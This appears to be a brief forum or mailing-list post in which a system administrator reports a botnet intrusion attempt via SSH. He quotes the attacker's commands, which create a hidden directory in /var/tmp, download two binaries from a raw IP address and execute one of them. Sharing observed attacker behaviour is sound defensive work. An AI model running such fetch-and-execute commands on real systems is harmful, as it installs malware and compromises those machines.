Interesting...
 From the first look of it this old botnet is way more advanced.
At least the installprocess is. the only thing the 'hacker' tried
to infect my Koyoney was:

cd /var/tmp;
mkdir .scan;
wget http://93.184.100.76:2700/pwn/syslgd;
wget http://93.184.100.76:2700/pwn/ssh;chmod u+x syslgd ssh;./syslgd;
rm syslgd;

Twice now btw, just had another ssh login from another IP that did the 
exact same thing.

Grtz,
Marco van Berkum
